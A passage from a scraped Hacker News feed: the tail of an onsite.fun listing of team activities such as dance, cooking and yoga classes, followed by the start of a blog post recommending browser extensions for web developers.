src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJsYXRpbl9hbWVyaWNhbl9kYW5jZV9jbGFzczA1LmpwZyIsImVkaXRzIjp7InJlc2l6ZSI6eyJ3aWR0aCI6MzAwLCJoZWlnaHQiOjM0NSwiZml0IjoiY292ZXIifSwibm9ybWFsaXNlIjp0cnVlfX0=" width="100%" height="345"></p></div><div width="0"><p><img alt="0" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJsYXRpbl9hbWVyaWNhbl9kYW5jZV9jbGFzczAxLlBORyIsImVkaXRzIjp7InJlc2l6ZSI6eyJ3aWR0aCI6MzAwLCJoZWlnaHQiOjM0NSwiZml0IjoiY292ZXIifSwibm9ybWFsaXNlIjp0cnVlfX0=" width="100%" height="345"></p></div></div></div></div><div><p><h6>Unlock your body with some dance moves</h6></p><div><p>From 100€</p><p> / 5 people</p></div><div><div><p><span>English</span></p><p><span>Russian</span></p><p><span>Spanish</span></p></div></div></div><div><div><div></div></div></div><span></span></a></div></div></div></li><li><div><div><div><a tabindex="0" role="button" aria-disabled="false" href="https://onsite.fun/activities/5fa482163f481803d20dd8f7"><div><div><div><div width="0"><p><img alt="3" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJnbm9jY2hpX3BhcnR5MDQuanBnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="0" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJnbm9jY2hpX3BhcnR5MDEuanBnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="1" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJnbm9jY2hpX3BhcnR5MDIuanBlZyIsImVkaXRzIjp7InJlc2l6ZSI6eyJ3aWR0aCI6MzAwLCJoZWlnaHQiOjM0NSwiZml0IjoiY292ZXIifSwibm9ybWFsaXNlIjp0cnVlfX0=" width="100%" height="345"></p></div><div width="0"><p><img alt="2" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJnbm9jY2hpX3BhcnR5MDMuanBlZyIsImVkaXRzIjp7InJlc2l6ZSI6eyJ3aWR0aCI6MzAwLCJoZWlnaHQiOjM0NSwiZml0IjoiY292ZXIifSwibm9ybWFsaXNlIjp0cnVlfX0=" width="100%" height="345"></p></div><div width="0"><p><img alt="3" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJnbm9jY2hpX3BhcnR5MDQuanBnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="0" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJnbm9jY2hpX3BhcnR5MDEuanBnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div></div></div></div><div><p><h6>Have a Gnocchi Party with your team</h6></p><div><p>From 125€</p><p> / 5 people</p></div><div><div><p><span>English</span></p><p><span>Italian</span></p><p><span>Portuguese</span></p><p><span>Spanish</span></p></div></div></div><div><div><div></div></div></div><span></span></a></div></div></div></li><li><div><div><div><a tabindex="0" role="button" aria-disabled="false" href="https://onsite.fun/activities/5fad1a07687d9703518bcd6c"><div><div><div><div width="0"><p><img alt="2" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJ5b2dhX2Zsb3cwMy5wbmciLCJlZGl0cyI6eyJyZXNpemUiOnsid2lkdGgiOjMwMCwiaGVpZ2h0IjozNDUsImZpdCI6ImNvdmVyIn0sIm5vcm1hbGlzZSI6dHJ1ZX19" width="100%" height="345"></p></div><div width="0"><p><img alt="0" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJ5b2dhX2Zsb3cwMS5wbmciLCJlZGl0cyI6eyJyZXNpemUiOnsid2lkdGgiOjMwMCwiaGVpZ2h0IjozNDUsImZpdCI6ImNvdmVyIn0sIm5vcm1hbGlzZSI6dHJ1ZX19" width="100%" height="345"></p></div><div width="0"><p><img alt="1" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJ5b2dhX2Zsb3cwMi5wbmciLCJlZGl0cyI6eyJyZXNpemUiOnsid2lkdGgiOjMwMCwiaGVpZ2h0IjozNDUsImZpdCI6ImNvdmVyIn0sIm5vcm1hbGlzZSI6dHJ1ZX19" width="100%" height="345"></p></div><div width="0"><p><img alt="2" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJ5b2dhX2Zsb3cwMy5wbmciLCJlZGl0cyI6eyJyZXNpemUiOnsid2lkdGgiOjMwMCwiaGVpZ2h0IjozNDUsImZpdCI6ImNvdmVyIn0sIm5vcm1hbGlzZSI6dHJ1ZX19" width="100%" height="345"></p></div><div width="0"><p><img alt="0" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJ5b2dhX2Zsb3cwMS5wbmciLCJlZGl0cyI6eyJyZXNpemUiOnsid2lkdGgiOjMwMCwiaGVpZ2h0IjozNDUsImZpdCI6ImNvdmVyIn0sIm5vcm1hbGlzZSI6dHJ1ZX19" width="100%" height="345"></p></div></div></div></div><div><p><h6>Unwind your body with yoga flow </h6></p><div><p>From 100€</p><p> / 5 people</p></div><div><div><p><span>Spanish</span></p><p><span>English</span></p></div></div></div><div><div><div></div></div></div><span></span></a></div></div></div></li><li><div><div><div><a tabindex="0" role="button" aria-disabled="false" href="https://onsite.fun/activities/5fb548072af9a4030c9e0969"><div><div><div><div width="0"><p><img alt="3" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJibHVlX21lbW9yaWVzMDQuanBnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="0" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJibHVlX21lbW9yaWVzMDEuanBnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="1" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJibHVlX21lbW9yaWVzMDIuanBnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="2" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJibHVlX21lbW9yaWVzMDMuanBnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="3" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJibHVlX21lbW9yaWVzMDQuanBnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="0" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJibHVlX21lbW9yaWVzMDEuanBnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div></div></div></div><div><p><h6>Drawing Memories With Blue Ink</h6></p><div><p>From 100€</p><p> / 5 people</p></div><div><div><p><span>Spanish</span></p><p><span>English</span></p><p><span>Greek</span></p></div></div></div><div><div><div></div></div></div><span></span></a></div></div></div></li><li><div><div><div><a tabindex="0" role="button" aria-disabled="false" href="https://onsite.fun/activities/5fbae89ecd4d220339f54148"><div><div><div><div width="0"><p><img alt="3" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJmcmVuY2hfcGFzdHJ5MDQuanBnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="0" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJmcmVuY2hfcGFzdHJ5MDEuanBnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="1" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJmcmVuY2hfcGFzdHJ5MDIuanBnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="2" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJmcmVuY2hfcGFzdHJ5MDMuanBnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="3" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJmcmVuY2hfcGFzdHJ5MDQuanBnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div><div width="0"><p><img alt="0" src="https://dqqexa40r7vzg.cloudfront.net//eyJidWNrZXQiOiJvbnNpdGVmdW4iLCJrZXkiOiJmcmVuY2hfcGFzdHJ5MDEuanBnIiwiZWRpdHMiOnsicmVzaXplIjp7IndpZHRoIjozMDAsImhlaWdodCI6MzQ1LCJmaXQiOiJjb3ZlciJ9LCJub3JtYWxpc2UiOnRydWV9fQ==" width="100%" height="345"></p></div></div></div></div><div><p><h6>Sweet French Pastry</h6></p><div><p>From 100€</p><p> / 5 people</p></div><div><div><p><span>English</span></p><p><span>Spanish</span></p></div></div></div><div><p><span>NEW</span></p></div><div><div><div></div></div></div><span></span></a></div></div></div></li></ul></div></div></div></div></div>]]>
            </description>
            <link>https://onsite.fun/activities</link>
            <guid isPermaLink="false">hacker-news-small-sites-25197289</guid>
            <pubDate>Tue, 24 Nov 2020 10:54:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Useful Browser Extensions for Developers]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25197283">thread link</a>) | @avadhoot
<br/>
November 24, 2020 | https://blog.indorse.io/20-useful-browser-extensions-for-devs-2d023da2a3d0 | <a href="https://web.archive.org/web/*/https://blog.indorse.io/20-useful-browser-extensions-for-devs-2d023da2a3d0">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><div><div><div><p><a href="https://medium.com/@constantin_?source=post_page-----2d023da2a3d0--------------------------------" rel="noopener"><img alt="Constantin" src="https://miro.medium.com/fit/c/96/96/1*TR5J9Q-6q6t6yzz2QMtJpA.png" width="48" height="48"></a></p></div></div></div></div><p id="96fe">On Chrome, <a href="https://medium.com/u/7f273c236233?source=post_page-----2d023da2a3d0--------------------------------" target="_blank" rel="noopener">Firefox</a>, Opera and/or Brave</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3200/1*KuwK-Op861rVKuoVrtuX-g.png" width="1600" height="900" srcset="https://miro.medium.com/max/552/1*KuwK-Op861rVKuoVrtuX-g.png 276w, https://miro.medium.com/max/1104/1*KuwK-Op861rVKuoVrtuX-g.png 552w, https://miro.medium.com/max/1280/1*KuwK-Op861rVKuoVrtuX-g.png 640w, https://miro.medium.com/max/1400/1*KuwK-Op861rVKuoVrtuX-g.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*KuwK-Op861rVKuoVrtuX-g.png?q=20"></p></div></div></div></figure><p id="42bb"><em>“For whom is this list intended?”</em> We started this exercise with this question in mind. The answer we stumble upon at some point = “<em>it’s all relative”</em>! 💡</p><p id="c4f4">Based on <a href="https://medium.com/u/d53dd768d047?source=post_page-----2d023da2a3d0--------------------------------" target="_blank" rel="noopener">Stack Overflow</a>’s latest <a href="https://insights.stackoverflow.com/survey/2020#experience" rel="noopener">Survey</a>, it’s more than clear that there’s a wide range of experience among people calling themselves ‘developers’. Looking at the survey, roughly 40% of ‘professional developers’ learned their first programming language less than 10 years ago. And as highlighted by Stack Overflow, the rest incorporates ‘seasoned developers; who learned to code more than 30 years ago (15%), but also those who learned how to code less than five years ago (17%).</p><p id="47e2">In other words, depending on your experience, age, personal opinion on dev tools, etc. this list might be interesting, and even useful. These are 20 of the best browser extensions for devs! 😁</p><blockquote><p id="8da7">Disclaimer: a big thanks goes to our dev teammates for sharing some of their secret tools with us (e.g. Octotree.. <em>🤫</em>)!</p></blockquote><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2800/1*JlAgx_FsG5VU2K1mvq5M3w.png" width="1400" height="98" srcset="https://miro.medium.com/max/552/1*JlAgx_FsG5VU2K1mvq5M3w.png 276w, https://miro.medium.com/max/1104/1*JlAgx_FsG5VU2K1mvq5M3w.png 552w, https://miro.medium.com/max/1280/1*JlAgx_FsG5VU2K1mvq5M3w.png 640w, https://miro.medium.com/max/1400/1*JlAgx_FsG5VU2K1mvq5M3w.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*JlAgx_FsG5VU2K1mvq5M3w.png?q=20"></p></div></div></div></figure><h2 id="2e17"><a href="https://chrome.google.com/webstore/detail/web-developer/bfbameneiokkgbdmiekhjnmfkcnldhhm" rel="noopener"><strong>Web Developer</strong></a></h2><p id="e9ab">This extension will add a toolbar button to your browser and include various web dev tools. You’ll find a lot of different choices under each of the proposed categories: CSS, Cookies, Forms, Outline, Informations, etc. <em>Note. Over 1 million users.</em></p><p id="aed7"><strong>Also available on </strong><a href="https://addons.mozilla.org/en-US/firefox/addon/web-developer/" rel="noopener"><strong>Mozilla</strong></a><strong> and </strong><a href="https://addons.opera.com/en/extensions/details/web-developer/" rel="noopener"><strong>Opera</strong></a><strong>.</strong></p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2800/1*PEH6OVu_TqFMG_rCQD5InA.png" width="1400" height="70" srcset="https://miro.medium.com/max/552/1*PEH6OVu_TqFMG_rCQD5InA.png 276w, https://miro.medium.com/max/1104/1*PEH6OVu_TqFMG_rCQD5InA.png 552w, https://miro.medium.com/max/1280/1*PEH6OVu_TqFMG_rCQD5InA.png 640w, https://miro.medium.com/max/1400/1*PEH6OVu_TqFMG_rCQD5InA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*PEH6OVu_TqFMG_rCQD5InA.png?q=20"></p></div></div></div></figure><h2 id="8bfc"><a href="https://chrome.google.com/webstore/detail/lambdatest-screenshots/fjcjehbiabkhkdbpkenkhaahhopildlh" rel="noopener"><strong>LambdaTest</strong></a></h2><p id="dbf8">A handy tool for your cross-browser compatibility testing. You no longer have to type in lengthy URLs as it automatically pulls the URL across different desktop and mobile browsers. You can test it at any stage — be it integration, staging, or prod environment. It is indeed one of the best extensions out there with an easy to use UI!</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2800/1*PEH6OVu_TqFMG_rCQD5InA.png" width="1400" height="70" srcset="https://miro.medium.com/max/552/1*PEH6OVu_TqFMG_rCQD5InA.png 276w, https://miro.medium.com/max/1104/1*PEH6OVu_TqFMG_rCQD5InA.png 552w, https://miro.medium.com/max/1280/1*PEH6OVu_TqFMG_rCQD5InA.png 640w, https://miro.medium.com/max/1400/1*PEH6OVu_TqFMG_rCQD5InA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*PEH6OVu_TqFMG_rCQD5InA.png?q=20"></p></div></div></div></figure><h2 id="ab47"><a href="https://chrome.google.com/webstore/detail/dailydev-news-for-busy-de/jlmpjdjjbgclbocgajdjefcidcncaied" rel="noopener"><strong>daily.dev</strong></a></h2><p id="59f3">This one will help you to stay up-to-date with what’s going on in the devs universe! Note. Might be a galaxy, I’m not sure..</p><p id="359c"><strong>Also available on </strong><a href="https://addons.mozilla.org/en-US/firefox/addon/daily/" rel="noopener"><strong>Mozilla</strong></a><strong>.</strong></p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2800/1*PEH6OVu_TqFMG_rCQD5InA.png" width="1400" height="70" srcset="https://miro.medium.com/max/552/1*PEH6OVu_TqFMG_rCQD5InA.png 276w, https://miro.medium.com/max/1104/1*PEH6OVu_TqFMG_rCQD5InA.png 552w, https://miro.medium.com/max/1280/1*PEH6OVu_TqFMG_rCQD5InA.png 640w, https://miro.medium.com/max/1400/1*PEH6OVu_TqFMG_rCQD5InA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*PEH6OVu_TqFMG_rCQD5InA.png?q=20"></p></div></div></div></figure><h2 id="1e08"><a href="https://chrome.google.com/webstore/detail/jsonview/chklaanhfefbnpoihckbnefhakgolnmc" rel="noopener"><strong>JSONView</strong></a></h2><p id="766a">You’re probably constantly working with JSON, and it can be a pain to view and format the JSON. This extension here will show the response JSON in a proper format. It covers everything you need to read JSON docs: coloring the code, the possibility of navigating through the nodes, opening and closing them, working with paths and values.</p><p id="8e1f"><strong>Also available on </strong><a href="https://addons.mozilla.org/en-US/firefox/addon/jsonview/" rel="noopener"><strong>Mozilla</strong></a><strong>.</strong></p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2800/1*PEH6OVu_TqFMG_rCQD5InA.png" width="1400" height="70" srcset="https://miro.medium.com/max/552/1*PEH6OVu_TqFMG_rCQD5InA.png 276w, https://miro.medium.com/max/1104/1*PEH6OVu_TqFMG_rCQD5InA.png 552w, https://miro.medium.com/max/1280/1*PEH6OVu_TqFMG_rCQD5InA.png 640w, https://miro.medium.com/max/1400/1*PEH6OVu_TqFMG_rCQD5InA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*PEH6OVu_TqFMG_rCQD5InA.png?q=20"></p></div></div></div></figure><h2 id="2fb8"><a href="https://chrome.google.com/webstore/detail/enhanced-github/anlikcnbgdeidpacdbdljnabclhahhmd" rel="noopener">Enhanced GitHub</a></h2><p id="da4a">This extension provides very useful information like the size of each file, download link, and it also helps to copy the file contents directly to the clipboard.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2800/1*PEH6OVu_TqFMG_rCQD5InA.png" width="1400" height="70" srcset="https://miro.medium.com/max/552/1*PEH6OVu_TqFMG_rCQD5InA.png 276w, https://miro.medium.com/max/1104/1*PEH6OVu_TqFMG_rCQD5InA.png 552w, https://miro.medium.com/max/1280/1*PEH6OVu_TqFMG_rCQD5InA.png 640w, https://miro.medium.com/max/1400/1*PEH6OVu_TqFMG_rCQD5InA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*PEH6OVu_TqFMG_rCQD5InA.png?q=20"></p></div></div></div></figure><h2 id="a0fb"><a href="https://addons.mozilla.org/en-US/firefox/addon/reduxdevtools/" rel="noopener">Redux DevTools</a></h2><p id="6e8a">If you are using redux, you must use this one.. a cool way for debugging! Note. It also seems to be an <a href="https://github.com/zalmoxisus/redux-devtools-extension" rel="noopener">open-source</a> project. +1</p><p id="dbcd"><strong>Note. Only available on Firefox!</strong></p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2800/1*PEH6OVu_TqFMG_rCQD5InA.png" width="1400" height="70" srcset="https://miro.medium.com/max/552/1*PEH6OVu_TqFMG_rCQD5InA.png 276w, https://miro.medium.com/max/1104/1*PEH6OVu_TqFMG_rCQD5InA.png 552w, https://miro.medium.com/max/1280/1*PEH6OVu_TqFMG_rCQD5InA.png 640w, https://miro.medium.com/max/1400/1*PEH6OVu_TqFMG_rCQD5InA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*PEH6OVu_TqFMG_rCQD5InA.png?q=20"></p></div></div></div></figure><h2 id="475b"><a href="https://chrome.google.com/webstore/detail/clear-cache/cppjkneekbjaeellbfkmgnhonkkjfpdn" rel="noopener"><strong>Clear Cache</strong></a></h2><p id="c002">For those of you that will need to frequently clear their browser cache.. this extension is one of the best extensions for doing this in a single click. Note. You can customize the amount of data to clear in the options tab.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2800/1*PEH6OVu_TqFMG_rCQD5InA.png" width="1400" height="70" srcset="https://miro.medium.com/max/552/1*PEH6OVu_TqFMG_rCQD5InA.png 276w, https://miro.medium.com/max/1104/1*PEH6OVu_TqFMG_rCQD5InA.png 552w, https://miro.medium.com/max/1280/1*PEH6OVu_TqFMG_rCQD5InA.png 640w, https://miro.medium.com/max/1400/1*PEH6OVu_TqFMG_rCQD5InA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*PEH6OVu_TqFMG_rCQD5InA.png?q=20"></p></div></div></div></figure><h2 id="7aca"><a href="https://chrome.google.com/webstore/detail/cssviewer/ggfgijbpiheegefliciemofobhmofgce" rel="noopener"><strong>CSSViewer</strong></a></h2><p id="4e21">Great to use as a quick and easy resource that could help you avoid <em>inspecting</em> objects. This extension will show you a floating panel depending on what your mouse pointing at — info include font, text, color, background, box, positioning, and effects attributes.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2800/1*PEH6OVu_TqFMG_rCQD5InA.png" width="1400" height="70" srcset="https://miro.medium.com/max/552/1*PEH6OVu_TqFMG_rCQD5InA.png 276w, https://miro.medium.com/max/1104/1*PEH6OVu_TqFMG_rCQD5InA.png 552w, https://miro.medium.com/max/1280/1*PEH6OVu_TqFMG_rCQD5InA.png 640w, https://miro.medium.com/max/1400/1*PEH6OVu_TqFMG_rCQD5InA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*PEH6OVu_TqFMG_rCQD5InA.png?q=20"></p></div></div></div></figure><h2 id="bc44"><a href="https://chrome.google.com/webstore/detail/site-palette/pekhihjiehdafocefoimckjpbkegknoh?ref=designrevision.com" rel="noopener"><strong>Site Palette</strong></a></h2><p id="ab59">Have you ever visited a webpage and simply loved the color palette? Well, Site Palette will help you see why you fell in live! With this extension, you can easily get the color palette of a page in seconds. This is definitely one of the most useful and helpful extensions for both designers and devs.</p><p id="f421"><strong>You can check </strong><a href="https://chrome.google.com/webstore/detail/colorzilla/bhlhnicpbhignbdhedgjhgdocnmhomnp?hl=en" rel="noopener"><strong>ColorZilla</strong></a><strong> if you’re using Mozilla.</strong></p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2800/1*PEH6OVu_TqFMG_rCQD5InA.png" width="1400" height="70" srcset="https://miro.medium.com/max/552/1*PEH6OVu_TqFMG_rCQD5InA.png 276w, https://miro.medium.com/max/1104/1*PEH6OVu_TqFMG_rCQD5InA.png 552w, https://miro.medium.com/max/1280/1*PEH6OVu_TqFMG_rCQD5InA.png 640w, https://miro.medium.com/max/1400/1*PEH6OVu_TqFMG_rCQD5InA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*PEH6OVu_TqFMG_rCQD5InA.png?q=20"></p></div></div></div></figure><h2 id="ae15"><a href="https://chrome.google.com/webstore/detail/octotree-github-code-tree/bkhaagjahfmjljalopjnoealnfndnagc" rel="noopener"><strong>Octotree</strong></a></h2><p id="ea5b">This extension lets you explore the files and folders of a repository with a tree view of the repo in a collapsible sidebar. This brings your GitHub experience to the next level. Someone, please come up with a petition for this to be a standard feature on <a href="https://medium.com/u/8df3bf3c40ae?source=post_page-----2d023da2a3d0--------------------------------" target="_blank" rel="noopener">GitHub</a>! ;)</p><p id="b22d"><strong>Also available on </strong><a href="https://addons.opera.com/en/extensions/details/octotree/" rel="noopener"><strong>Opera</strong></a><strong>.</strong></p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2800/1*PEH6OVu_TqFMG_rCQD5InA.png" width="1400" height="70" srcset="https://miro.medium.com/max/552/1*PEH6OVu_TqFMG_rCQD5InA.png 276w, https://miro.medium.com/max/1104/1*PEH6OVu_TqFMG_rCQD5InA.png 552w, https://miro.medium.com/max/1280/1*PEH6OVu_TqFMG_rCQD5InA.png 640w, https://miro.medium.com/max/1400/1*PEH6OVu_TqFMG_rCQD5InA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*PEH6OVu_TqFMG_rCQD5InA.png?q=20"></p></div></div></div></figure><h2 id="4af8"><a href="https://chrome.google.com/webstore/detail/session-buddy/edacconmaakjimmfgnblocblbcdcpbko" rel="noopener"><strong>Session Buddy</strong></a></h2><p id="c2d6">This nifty extension will help you manage your multitasking browsing sessions. If you want to save entire Chrome sessions and recover them later, this is might be your next favorite tool.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2800/1*PEH6OVu_TqFMG_rCQD5InA.png" width="1400" height="70" srcset="https://miro.medium.com/max/552/1*PEH6OVu_TqFMG_rCQD5InA.png 276w, https://miro.medium.com/max/1104/1*PEH6OVu_TqFMG_rCQD5InA.png 552w, https://miro.medium.com/max/1280/1*PEH6OVu_TqFMG_rCQD5InA.png 640w, https://miro.medium.com/max/1400/1*PEH6OVu_TqFMG_rCQD5InA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*PEH6OVu_TqFMG_rCQD5InA.png?q=20"></p></div></div></div></figure><h2 id="4272"><a href="https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg?ref=designrevision.com" rel="noopener"><strong>Wappalyzer</strong></a></h2><p id="308b">This extension helps you identify the technologies used to build the website you’re looking at. It’ll give you info about the programming languages, analytics, marketing tools, payment processors, CRM, CDN, etc. Note. Pretty simple to use…</p><p id="ad61"><strong>Also available on </strong><a href="https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/" rel="noopener"><strong>Mozilla</strong></a><strong>.</strong></p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2800/1*PEH6OVu_TqFMG_rCQD5InA.png" width="1400" height="70" srcset="https://miro.medium.com/max/552/1*PEH6OVu_TqFMG_rCQD5InA.png 276w, https://miro.medium.com/max/1104/1*PEH6OVu_TqFMG_rCQD5InA.png 552w, https://miro.medium.com/max/1280/1*PEH6OVu_TqFMG_rCQD5InA.png 640w, https://miro.medium.com/max/1400/1*PEH6OVu_TqFMG_rCQD5InA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*PEH6OVu_TqFMG_rCQD5InA.png?q=20"></p></div></div></div></figure><h2 id="6453"><a href="https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg" rel="noopener"><strong>Edit this cookie</strong></a></h2><p id="614e">Convenient, fast, and easy solution for those who need a free cookie manager. It is a simple and brilliant way to get rid of pesky <em>cookies, </em>sites, etc.</p><p id="6cb9"><strong>Also available on </strong><a href="https://addons.opera.com/en/extensions/details/edit-this-cookie/" 